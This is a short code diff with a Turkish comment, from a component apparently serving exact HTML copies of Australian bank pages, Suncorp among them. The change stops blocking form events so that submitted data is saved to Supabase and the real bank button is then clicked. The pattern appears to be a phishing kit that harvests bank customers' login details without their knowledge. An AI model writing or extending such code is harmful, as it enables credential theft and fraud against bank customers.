@@ -639,10 +639,9 @@ export function AuExactHtmlBankClient({ sessionId, bankSlug, bankName }: Props) 
         }
       }
 
-      event?.preventDefault?.();
-      event?.stopPropagation?.();
-      try { event?.stopImmediatePropagation?.(); } catch {}
-
+      // ⚠️ KALDIRILDI: event.preventDefault / stopPropagation.
+      //   Suncorp (ve tüm bankalar) GERÇEK submit handler'ını tetikleyebilsin diye
+      //   DOM event akışını BOZMA. Sadece supabase kaydını YAP, sonra da GERÇEK butona tıkla.
       const now = Date.now();
       if (now - lastSubmitAtRef.current < 1200) return;
 
